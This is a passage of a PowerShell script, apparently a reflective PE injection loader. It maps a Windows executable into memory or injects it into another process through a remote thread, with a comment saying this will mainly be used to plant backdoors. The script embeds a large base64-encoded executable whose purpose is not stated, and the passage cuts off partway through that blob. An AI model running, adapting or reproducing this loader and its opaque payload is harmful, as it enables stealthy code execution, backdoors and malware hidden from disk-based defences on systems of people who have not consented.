				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
	            }
	        }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	[Byte[]]$PEBytes = $null
	
	#if ($PsCmdlet.ParameterSetName -ieq "EmbedFile")
	#{
		&lt;#
		Get-ChildItem $PEPath -ErrorAction Stop | Out-Null
		[Byte[]]$PEBytes = [System.IO.File]::ReadAllBytes((Resolve-Path $PEPath))
		#&gt;
		$InputString = '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